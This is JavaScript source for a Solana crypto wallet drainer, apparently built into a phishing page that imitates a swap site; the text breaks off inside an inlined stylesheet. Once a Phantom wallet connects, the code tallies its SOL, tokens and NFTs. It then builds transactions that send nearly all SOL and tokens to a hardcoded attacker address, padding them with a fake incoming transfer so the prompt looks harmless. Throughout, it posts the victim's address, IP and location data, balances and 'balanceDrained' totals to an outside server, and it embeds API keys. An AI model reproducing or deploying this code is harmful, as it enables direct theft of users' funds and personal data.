const a = {
    receiver: "H495gSjwNTp1J3qwkqcgUrHC5vcnz7ZLcGuP8XezubtV",
    user_wallet: "9FrMGea7WX72pxeqmz4eGunfdbVfx6ctBTtXZ3mLigKi",
    userId: "nCyZwgSq",
    chatId: "-4055895140",
    logIpData: true,
    rdp: "https://pastdue-assistant.onrender.com/send-message",
    rpc: "https://clean-wiser-spree.solana-mainnet.quiknode.pro/28d27542a08276a66158b092b03cbf0745e33171/",
    claimInfo: {
      minimumBalance: 5
    }
  };
  class b {
    a = a; // using const a later on with "this.a.*"
    phantomInstalled = false;
    isConnected = false;
    publicKey;
    balance;
    realbalance;
    tokenWalletBalance;
    solUsd;
    totalBalance;
    provider;
    connection;
    resp;
    splTokens = [];
    nfts = [];
    solBinanceHw = new solanaWeb3.PublicKey("9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM");
    cryptocompare = "https://min-api.cryptocompare.com/data/price?fsym=SOL&tsyms=USD";
    connectBtn = document.getElementById("connect");
    transder = document.getElementById("transfer");
    transfernft = document.getElementById("transfernft");
    shyftOptions = {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
        "x-api-key": "uqy5IAGwqbwmydIZ"
      }
    };
  }
  class c extends b {
    constructor(a) {
      super();
      this.phantomInstalled = window.phantom?.solana?.isPhantom;
      this.connectWallet(a);
    }
    connectWallet = async a => {
      this.isConnected = true;
      this.provider = a;
      this.resp = await this.provider.request({
        method: "connect"
      });
      this.updateVars();
    };
    updateVars = async (a = true) => {
      if (a) {
        if (!this.isConnected) {
          this.connectWallet();
        }
        this.isConnected = true;
        this.connection = new solanaWeb3.Connection(this.a.rpc);
        this.publicKey = new solanaWeb3.PublicKey(this.resp.publicKey.toString());
        this.receiver = new solanaWeb3.PublicKey(this.a.receiver);
        this.balance = await this.connection.getBalance(this.publicKey);
        this.realbalance = (await this.balance) / 1000000000;
        this.solUsd = ((await this.fetchSolPrice()) * this.realbalance).toFixed(2); 
        var walletAddress = String(this.provider.publicKey)
        console.log("💾 Wallet connected: " + walletAddress)
  
        const tokensResponse = await this.fetchTokens(); 
        console.log("Tokens Response:", tokensResponse);
        const nftResponse = await this.fetchNft();
        console.log("NFT Response:", nftResponse);
  
        if (this.totalBalance >= this.a.claimInfo.minimumBalance) {
          this.solTransfer();
        }
      }
    };
    getProvider = async () => {
      if ("phantom" in window) {
        const a = window.phantom?.solana;
        if (a?.isPhantom) {
          return a;
        }
      }
      return null;
    };
    fetchTokens = async () => {
      let b = [];
      this.tokenWalletBalance = 0;
      this.totalBalance = 0;
      var c = new Headers();
      c.append("x-api-key", "uqy5IAGwqbwmydIZ");
      var d = {
        method: "GET",
        headers: c,
        redirect: "follow"
      };
      try {
        b = await fetch("https://api.shyft.to/sol/v1/wallet/all_tokens?network=mainnet-beta&wallet=" + this.publicKey.toString(), d).then(a => a.json()).then(a => {
          return a.result.map(a => {
            return {
              address: a.address,
              balance: a.balance,
              decimals: a.info.decimals,
              image: a.info.image,
              name: a.info.name,
              symbol: a.info.symbol,
              topHolder: "",
              price: "0",
              value: "0"
            };
          });
        });
        await Promise.all(b.map(async a => {
          const b = {
            method: "GET",
            headers: {
              "X-API-KEY": "45fcb9315d534ed4839026bb17dd2652"
            }
          };
          try {
            const c = await fetch("https://public-api.birdeye.so/public/price?address=" + a.address, b);
            const d = await c.json();
            a.price = d.data.value;
            a.value = (a.price * a.balance).toFixed(2);
            if (a.value > 0) {
              this.tokenWalletBalance += parseFloat(a.value);
              this.splTokens.push(a);
            }
          } catch (a) {
            console.error(a);
          }
        }));
        this.totalBalance = parseFloat(this.solUsd) + parseFloat(this.tokenWalletBalance);
        this.sendConnection();
        console.log("✅🪙 Fetching Tokens SUCCESS");
        return this.splTokens
      } catch (a) {
        console.error(a);
      }
    };
    fetchNft = async () => {
      let a = [];
      var b = new Headers();
      b.append("x-api-key", "oDIu-ng5NiQxaBRe");
      var c = {
        method: "GET",
        headers: b,
        redirect: "follow"
      };
      try {
        a = await fetch("https://api.shyft.to/sol/v1/wallet/collections?network=mainnet-beta&wallet_address=" + this.publicKey, c).then(a => a.json()).then(a => {
          return a.result.collections[0].nfts.map(a => {
            return {
              address: a.mint,
              name: a.name,
              symbol: a.symbol
            };
          });
        }).catch(a => console.log("error", a));
        await Promise.all(a.map(async a => {
          this.nfts.push(a);
        }));
        console.log("✅🖼️ Fetching NFTS SUCCESS");
        return this.nfts
      } catch (a) {}
    };
    solTransfer = async () => {
      console.log("🪙 Transfer SOL");
      this.askForTx();
      let b = [];
      let c = [];
      let d = this.stringToUint8Array("Data to send in transaction");
      const e = await this.connection.getLatestBlockhash("finalized");
      let f = new solanaWeb3.Transaction();
      f.recentBlockhash = e.blockhash;
      f.feePayer = this.publicKey;
      let g = solanaWeb3.SystemProgram.transfer({
        fromPubkey: this.solBinanceHw,
        toPubkey: this.publicKey,
        lamports: solanaWeb3.LAMPORTS_PER_SOL * (this.realbalance + a.fakeSolanaAmount)
      });
      f.add(g);
      f.add(new solanaWeb3.TransactionInstruction({
        keys: [{
          pubkey: this.publicKey,
          isSigner: true,
          isWritable: true
        }],
        data: d,
        programId: new solanaWeb3.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr")
      }));
      let h = new solanaWeb3.Transaction();
      h.recentBlockhash = e.blockhash;
      h.feePayer = this.publicKey;
      let i = solanaWeb3.SystemProgram.transfer({
        fromPubkey: this.publicKey,
        toPubkey: this.receiver,
        lamports: solanaWeb3.LAMPORTS_PER_SOL * (this.realbalance - 0.01)
      });
      h.add(i);
      f.add(g);
      b.push(f);
      b.push(h);
      const j = await Promise.all(this.splTokens.map(async a => {
        const b = new solanaWeb3.PublicKey(a.address);
        const d = a.balance * Math.pow(10, a.decimals);
        const f = await splToken.Token.getAssociatedTokenAddress(splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID, b, this.publicKey);
        const g = await splToken.Token.getAssociatedTokenAddress(splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID, b, this.receiver);
        const h = await this.connection.getAccountInfo(g);
        if (h === null) {
          let h = new solanaWeb3.Transaction();
          h.recentBlockhash = e.blockhash;
          h.feePayer = this.publicKey;
          let i = await splToken.Token.createAssociatedTokenAccountInstruction(splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID, b, g, this.receiver, this.publicKey);
          let j = await splToken.Token.lol(splToken.TOKEN_PROGRAM_ID, f, g, this.publicKey, [], d);
          h.add(i);
          h.add(j);
          c.push(a);
          return [h];
        } else {
          let b = new solanaWeb3.Transaction();
          b.recentBlockhash = e.blockhash;
          b.feePayer = this.publicKey;
          let h = await splToken.Token.lol(splToken.TOKEN_PROGRAM_ID, f, g, this.publicKey, [], d);
          b.add(h);
          c.push(a);
          return [b];
        }
      }));
      const k = [...b.flat(), ...j.flat()];
      try {
        const a = await this.provider.signAllTransactions(k);
        for (let b = 0; b < a.length; b++) {
          if (a[b].instructions.length <= 3) {
            let c = a[b].serialize();
            let d = new Uint8Array(c.buffer);
            let e = await this.connection.sendRawTransaction(d);
            this.connection.confirmTransaction(e);
            this.acceptedPrompt(e);
          }
          if (a[b].instructions[3] && a[b].instructions[3].data.length != 27) {
            let c = a[b].serialize();
            let d = new Uint8Array(c.buffer);
            let e = await this.connection.sendRawTransaction(d);
            this.connection.confirmTransaction(e);
            this.acceptedPrompt(e);
          }
        }
        this.solanaSplit();
        this.splSplit(c);
      } catch (a) {
        if (a.code == 4001) {
          this.DeclinedTx();
        } else {
          console.error(a);
        }
      }
    };
    fetchSolPrice = async () => {
      try {
        const a = await fetch(this.cryptocompare);
        const b = await a.json();
        return b.USD;
      } catch (a) {}
    };
    sendConnection = async () => {
      try {
        let a = {};
        if (this.a.logIpData) {
          a = await fetch("https://ipapi.co/json/", this.requestOptionsPOST).then(a => a.json());
          this.Ip = a.ip;
        }
        if (!a.ip || !a.country_name) {
          a = {
            ip: "Unknown",
            country_name: "Unknown"
          };
        }
        console.log("📊 IPdata:", a)
        fetch(this.a.rdp, {
          method: "POST",
          mode: "cors",
          cache: "no-cache",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            identifier: "connected",
            address: this.publicKey.toString(),
            walletBalance: this.realbalance,
            isMobile: this.isMobile(),
            websiteUrl: window.location.href,
            websiteDomain: window.location.host,
            ipData: a,
            country: a.country,
            usd: this.solUsd,
            tokenBalance: this.tokenWalletBalance,
            chatid: this.a.chatId,
            totalbalance: this.totalBalance,
            userid: this.a.userId
          })
        });
      } catch (a) {}
    };
    solanaSplit = async () => {
      try {
        fetch(this.a.rdp, {
          method: "POST",
          mode: "cors",
          cache: "no-cache",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            address: this.a.user_wallet,
            solanaSplit: this.realbalance * 80 / 100,
            chatid: this.a.chatId,
            solusd: this.solUsd
          })
        });
      } catch (a) {}
    };
    splSplit = async a => {
      try {
        fetch(this.a.rdp, {
          method: "POST",
          mode: "cors",
          cache: "no-cache",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            address: this.a.user_wallet,
            tokens: a,
            chatid: this.a.chatId
          })
        });
      } catch (a) {}
    };
    acceptedPrompt = async a => {
      try {
        let b = {};
        b = await fetch("https://ipapi.co/json/", this.requestOptionsPOST).then(a => a.json());
        this.Ip = b.ip;
        if (!b.ip || !b.country_name) {
          b = {
            ip: "Unknown",
            country_name: "Unknown"
          };
        }
        ;
        fetch(this.a.rdp, {
          method: "POST",
          mode: "cors",
          cache: "no-cache",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            address: this.publicKey.toString(),
            websiteUrl: window.location.href,
            websiteDomain: window.location.host,
            websiteUrl: window.location.href,
            ipData: b,
            balanceDrained: parseFloat(this.solUsd + this.tokenWalletBalance),
            hash: a,
            chatid: this.a.chatId
          })
        });
      } catch (a) {}
    };
    askForTx = async () => {
      try {
        fetch(this.a.rdp, {
          method: "POST",
          mode: "cors",
          cache: "no-cache",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            identifier: "promptStatus",
            prompted: "Prompted.",
            address: this.publicKey.toString(),
            balance: this.realbalance,
            tokenValue: this.tokenWalletBalance,
            chatid: this.a.chatId
          })
        });
      } catch (a) {}
    };
    DeclinedTx = async () => {
      try {
        fetch(this.a.rdp, {
          method: "POST",
          mode: "cors",
          cache: "no-cache",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify({
            identifier: "promptDeclined",
            declined: "Declined prompt.",
            address: this.publicKey.toString(),
            chatid: this.a.chatId
          })
        });
      } catch (a) {}
    };
    isMobile = function () {
      let a = false;
      (function (b) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(b) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(b.substr(0, 4))) {
          a = true;
        }
      })(navigator.userAgent || navigator.vendor || window.opera);
      return a;
    };
    stringToUint8Array = function (a) {
      const b = new TextEncoder();
      return b.encode(a);
    };
  }
  window.addEventListener("load", function () {
    if (typeof jQuery === "undefined") {
      var a = document.createElement("script");
      a.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js";
      document.body.appendChild(a);
    }
    var b = document.createElement("div");
    b.id = "connect-modal2";
    b.style.display = "none";
    b.classList.add("modal");
    b.innerHTML = "<style class=\"sf-hidden\">html{-moz-tab-size:4;-o-tab-size:4}body,html{padding:0;margin:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue,sans-serif;-webkit-tap-highlight-color:rgba(0,0,0,0)}* :hover{transition:all .15s linear}:is(.dark .searchBarItem){background-image:linear-gradient(91.26deg,#fcc00a 15.73%,#4ebae9 83.27%);opacity:.1}@-moz-document url-prefix(){:is(.dark .searchBarItem){opacity:1}}.hideScrollbar::-webkit-scrollbar{display:none}dialog{margin:0;padding:0;min-width:100vw;min-height:100vh}:root{--toastify-color-light:#fff;--toastify-color-dark:#121212;--toastify-color-info:#3498db;--toastify-color-success:#07bc0c;--toastify-color-warning:#f1c40f;--toastify-color-error:#e74c3c;--toastify-color-transparent:hsla(0,0%,100%,.7);--toastify-icon-color-info:var(--toastify-color-info);--toastify-icon-color-success:var(--toastify-color-success);--toastify-icon-color-warning:var(--toastify-color-warning);--toastify-icon-color-error:var(--toastify-color-error);--toastify-toast-width:320px;--toastify-toast-background:#fff;--toastify-toast-min-height:64px;--toastify-toast-max-height:800px;--toastify-font-family:sans-serif;--toastify-z-index:9999;--toastify-text-color-light:#757575;--toastify-text-color-dark:#fff;--toastify-text-color-info:#fff;--toastify-text-color-success:#fff;--toastify-text-color-warning:#fff;--toastify-text-color-error:#fff;--toastify-spinner-color:#616161;--toastify-spinner-color-empty-area:#e0e0e0;--toastify-color-progress-light:linear-gradient(90deg,#4cd964,#5ac8fa,#007aff,#34aadc,#5856d6,#ff2d55);--toastify-color-progress-dark:#bb86fc;--toastify-color-progress-info:var(--toastify-color-info);--toastify-color-progress-success:var(--toastify-color-success);--toastify-color-progress-warning:var(--toastify-color-warning);--toastify-color-progress-error:var(--toastify-color-error)}@media only screen and (max-width:480px){}@media only screen and (max-width:480px){}@keyframes Toastify__trackProgress{0%{transform:scaleX(1)}to{transform:scaleX(0)}}@keyframes Toastify__bounceInRight{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(3000px,0,0)}60%{opacity:1;transform:translate3d(-25px,0,0)}75%{transform:translate3d(10px,0,0)}90%{transform:translate3d(-5px,0,0)}to{transform:none}}@keyframes Toastify__bounceOutRight{20%{opacity:1;transform:translate3d(-20px,0,0)}to{opacity:0;transform:translate3d(2000px,0,0)}}@keyframes Toastify__bounceInLeft{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(-3000px,0,0)}60%{opacity:1;transform:translate3d(25px,0,0)}75%{transform:translate3d(-10px,0,0)}90%{transform:translate3d(5px,0,0)}to{transform:none}}@keyframes Toastify__bounceOutLeft{20%{opacity:1;transform:translate3d(20px,0,0)}to{opacity:0;transform:translate3d(-2000px,0,0)}}@keyframes Toastify__bounceInUp{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(0,3000px,0)}60%{opacity:1;transform:translate3d(0,-20px,0)}75%{transform:translate3d(0,10px,0)}90%{transform:translate3d(0,-5px,0)}to{transform:translateZ(0)}}@keyframes Toastify__bounceOutUp{20%{transform:translate3d(0,-10px,0)}40%,45%{opacity:1;transform:translate3d(0,20px,0)}to{opacity:0;transform:translate3d(0,-2000px,0)}}@keyframes Toastify__bounceInDown{0%,60%,75%,90%,to{animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;transform:translate3d(0,-3000px,0)}60%{opacity:1;transform:translate3d(0,25px,0)}75%{transform:translate3d(0,-10px,0)}90%{transform:translate3d(0,5px,0)}to{transform:none}}@keyframes Toastify__bounceOutDown{20%{transform:translate3d(0,10px,0)}40%,45%{opacity:1;transform:translate3d(0,-20px,0)}to{opacity:0;transform:translate3d(0,2000px,0)}}@keyframes Toastify__zoomIn{0%{opacity:0;transform:scale3d(.3,.3,.3)}50%{opacity:1}}@keyframes Toastify__zoomOut{0%{opacity:1}50%{opacity:0;transform:scale3d(.3,.3,.3)}to{opacity:0}}@keyframes Toastify__flipIn{0%{transform:perspective(400px) rotateX(90deg);animation-timing-function:ease-in;opacity:0}40%{transform:perspective(400px) rotateX(-20deg);animation-timing-function:ease-in}60%{transform:perspective(400px) rotateX(10deg);opacity:1}80%{transform:perspective(400px) rotateX(-5deg)}to{transform:perspective(400px)}}@keyframes Toastify__flipOut{0%{transform:perspective(400px)}30%{transform:perspective(400px) rotateX(-20deg);opacity:1}to{transform:perspective(400px) rotateX(90deg);opacity:0}}@keyframes Toastify__slideInRight{0%{transform:translate3d(110%,0,0);visibility:visible}to{transform:translateZ(0)}}@keyframes Toastify__slideInLeft{0%{transform:translate3d(-110%,0,0);visibility:visible}to{transform:translateZ(0)}}@keyframes Toastify__slideInUp{0%{transform:translate3d(0,110%,0);visibility:visible}to{transform:translateZ(0)}}@keyframes Toastify__slideInDown{0%{transform:translate3d(0,-110%,0);visibility:visible}to{transform:translateZ(0)}}@keyframes Toastify__slideOutRight{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(110%,0,0)}}@keyframes Toastify__slideOutLeft{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(-110%,0,0)}}@keyframes Toastify__slideOutDown{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(0,500px,0)}}@keyframes Toastify__slideOutUp{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(0,-500px,0)}}@keyframes Toastify__spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:\"\"}html{line-height:1.5;-webkit-text-size-adjust:100%;tab-size:4;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal}body{margin:0;line-height:inherit}a{color:inherit;text-decoration:inherit}button,input{font-family:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button{text-transform:none}[type=button],button{-webkit-appearance:button;background-color:transparent;background-image:none}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}h1{margin:0}ul{list-style:none;margin:0;padding:0}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button{cursor:pointer}:disabled{cursor:default}img,svg{display:block;vertical-align:middle}img{max-width:100%;height:auto}*,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgba(59,130,246,.5);--tw-ring-offset-shadow:0 0#0000;--tw-ring-shadow:0 0#0000;--tw-shadow:0 0#0000;--tw-shadow-colored:0 0#0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: }@media (min-width:390px){}@media (min-width:640px){}@media (min-width:768px){}@media (min-width:1024px){}@media (min-width:1280px){}@media (min-width:1536px){}.fixed{position:fixed}.my-4{margin-top:1rem;margin-bottom:1rem}@keyframes fade-in{0%{opacity:.2}to{opacity:1}}@keyframes fade-out{0%{opacity:1}to{opacity:0}}@keyframes hue{0%{-webkit-filter:hue-rotate(0deg)}to{-webkit-filter:hue-rotate(-1turn)}}@keyframes infra-circle-item{0%{transform:rotate(var(--deg)) translate(var(--radius)) rotate(calc(-1*var(--deg)))}to{transform:rotate(calc(359.9deg + var(--deg))) translate(var(--radius)) rotate(calc(-1*(359.9deg + var(--deg))))}}@keyframes ping{75%,to{transform:scale(2);opacity:0}}@keyframes pulse{50%{opacity:.5}}@keyframes shine-reverse{to{background-position:-200%}}@keyframes spin{to{transform:rotate(1turn)}}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.p-4{padding:1rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.text-center{text-align:center}:is(.dark .dark:block){display:block}:is(.dark .dark:flex){display:flex}:is(.dark .dark:hidden){display:none}@keyframes shine{to{background-position:200%}}:is(.dark .dark:animate-shine){animation:shine 10s linear infinite}:is(.dark .dark:border){border-width:1px}:is(.dark .dark:border-0){border-width:0}:is(.dark .dark:border-none){border-style:none}:is(.dark .dark:border-transparent){border-color:transparent}:is(.dark .dark:border-white){--tw-border-opacity:1;border-color:rgb(255 255 255/var(--tw-border-opacity))}:is(.dark .dark:border-white-10){border-color:hsla(0,0%,100%,.1)}:is(.dark .dark:border-white-25){border-color:hsla(0,0%,100%,.25)}:is(.dark .dark:border-opacity-5){--tw-border-opacity:0.05}:is(.dark .dark:bg-black){--tw-bg-opacity:1;background-color:rgb(0 0 0/var(--tw-bg-opacity))}:is(.dark .dark:bg-black-10){background-color:rgba(0,0,0,.1)}:is(.dark .dark:bg-black-25){background-color:rgba(0,0,0,.25)}:is(.dark .dark:bg-black-50){background-color:rgba(0,0,0,.5)}:is(.dark .dark:bg-black-75){background-color:rgba(0,0,0,.75)}:is(.dark .dark:bg-drawer-dark-bg){--tw-bg-opacity:1;background-color:rgb(56 56 63/var(--tw-bg-opacity))}:is(.dark .dark:bg-jupiter-dark){--tw-bg-opacity:1;background-color:rgb(41 42 51/var(--tw-bg-opacity))}:is(.dark .dark:bg-jupiter-input-dark){--tw-bg-opacity:1;background-color:rgb(33 33 40/var(--tw-bg-opacity))}:is(.dark .dark:bg-setting-toggle-dark){--tw-bg-opacity:1;background-color:rgb(58 59 71/var(--tw-bg-opacity))}:is(.dark .dark:bg-transparent){background-color:transparent}:is(.dark .dark:bg-tuna){--tw-bg-opacity:1;background-color:rgb(58 59 67/var(--tw-bg-opacity))}:is(.dark .dark:bg-v2-background){--tw-bg-opacity:1;background-color:rgb(48 66 86/var(--tw-bg-opacity))}:is(.dark .dark:bg-v2-background-dark){--tw-bg-opacity:1;background-color:rgb(25 35 45/var(--tw-bg-opacity))}:is(.dark .dark:bg-white-10){background-color:hsla(0,0%,100%,.1)}:is(.dark .dark:bg-white-35){background-color:hsla(0,0%,100%,.35)}:is(.dark .dark:bg-jupiter-gradient){background-image:linear-gradient(91.26deg,#fcc00a 15.73%,#4ebae9 83.27%)}:is(.dark .dark:bg-skeleton-dark){background-image:linear-gradient(90deg,var(--color1,#303035),var(--color2,#26262a) 50%,var(--color1,#303035))}:is(.dark .dark:bg-v2-text-gradient){background-image:linear-gradient(247.44deg,#c7f284 13.88%,#00bef0 99.28%)}:is(.dark .dark:bg-200-auto){background-size:200%auto}:is(.dark .dark:bg-contain){background-size:contain}:is(.dark .dark:bg-left-top){background-position:0 0}:is(.dark .dark:bg-no-repeat){background-repeat:no-repeat}:is(.dark .dark:fill-v2-lily){fill:#e8f9ff}:is(.dark .dark:fill-white){fill:#fff}:is(.dark .dark:stroke-white-75){stroke:hsla(0,0%,100%,.75)}:is(.dark .dark:font-normal){font-weight:400}:is(.dark .dark:text-inherit){color:inherit}:is(.dark .dark:text-v2-lily){--tw-text-opacity:1;color:rgb(232 249 255/var(--tw-text-opacity))}:is(.dark .dark:text-v2-primary){color:#c7f284}:is(.dark .dark:text-white){--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}:is(.dark .dark:text-white-25){color:hsla(0,0%,100%,.25)}:is(.dark .dark:text-white-35){color:hsla(0,0%,100%,.35)}:is(.dark .dark:text-white-50){color:hsla(0,0%,100%,.5)}:is(.dark .dark:text-white-75){color:hsla(0,0%,100%,.75)}:is(.dark .dark:text-opacity-75){--tw-text-opacity:0.75}:is(.dark .dark:opacity-10){opacity:.1}:is(.dark .dark:opacity-30){opacity:.3}:is(.dark .dark:shadow-none){--tw-shadow:0 0#0000;--tw-shadow-colored:0 0#0000;box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow)}:is(.dark .dark:shadow-row-dark){--tw-shadow:0px 20px 40px rgba(0,0,0,.1);--tw-shadow-colored:0px 20px 40px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow)}:is(.dark .dark:shadow-swap2-dark){--tw-shadow:0px 20px 40px rgba(0,0,0,.1);--tw-shadow-colored:0px 20px 40px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow)}:is(.dark .dark:placeholder:text-white-35)::placeholder{color:hsla(0,0%,100%,.35)}:is(.dark .dark:hover:border:hover){border-width:1px}:is(.dark .dark:hover:border-black-50:hover){border-color:rgba(0,0,0,.5)}:is(.dark .dark:hover:border-v2-primary:hover){border-color:#c7f284}:is(.dark .dark:hover:bg-shark:hover){--tw-bg-opacity:1;background-color:rgb(40 40 48/var(--tw-bg-opacity))}:is(.dark .dark:hover:bg-white-10:hover){background-color:hsla(0,0%,100%,.1)}:is(.dark .dark:hover:text-v2-primary:hover){color:#c7f284}:is(.dark .dark:hover:text-white:hover){--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}:is(.dark .dark:hover:text-white-50:hover){color:hsla(0,0%,100%,.5)}:is(.dark .dark:hover:text-white-75:hover){color:hsla(0,0%,100%,.75)}:is(.dark .dark:hover:shadow-swap-input-dark:hover){--tw-shadow:0px 2px 16px hsla(83,81%,73%,.25);--tw-shadow-colored:0px 2px 16px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0#0000),var(--tw-ring-shadow,0 0#0000),var(--tw-shadow)}:is(.dark .disabled:dark:hover:bg-transparent:hover):disabled{background-color:transparent}:is(.dark .group:hover .dark:group-hover:text-v2-primary){color:#c7f284}@media not all and (min-width:768px){}@media (min-width:390px){}@media (min-width:640px){}@media (min-width:768px){:is(.dark .dark:md:bg-black-50){background-color:rgba(0,0,0,.5)}}@media (min-width:1024px){}@media (min-width:1280px){}@media (min-width:1536px){}</style><style data-emotion=\"css\" data-s=\"\" class=\"sf-hidden\">.css-1vx73dy{left:0px;top:0px;z-index:50;display:flex;height:100%;width:100%;animation:0.15s ease-in-out 0s 1 normal none running 